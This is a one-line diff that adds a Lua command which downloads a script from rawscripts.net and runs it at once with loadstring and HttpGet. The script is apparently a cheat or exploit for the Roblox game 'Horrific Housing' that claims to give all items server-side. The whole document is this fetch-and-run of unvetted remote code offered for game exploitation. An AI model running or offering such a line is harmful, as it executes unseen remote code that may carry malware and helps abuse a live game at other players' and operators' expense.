@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://rawscripts.net/raw/Horrific-Housing-OP-GET-ALL-ITEMS-AND-EVERYTHING-SERVERSIDE-9928"))()
